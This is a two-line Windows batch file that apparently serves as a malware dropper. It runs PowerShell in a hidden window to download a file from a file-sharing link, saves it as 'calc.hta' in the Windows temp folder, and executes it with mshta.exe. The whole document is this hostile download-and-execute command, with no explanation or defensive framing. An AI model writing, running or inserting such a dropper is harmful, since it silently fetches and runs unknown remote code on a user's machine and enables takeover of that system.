@echo off
powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://files.fm/down.php?i=bbvvssnu', 'c:/windows/temp/calc.hta'); mshta.exe c:/windows/temp/calc.hta
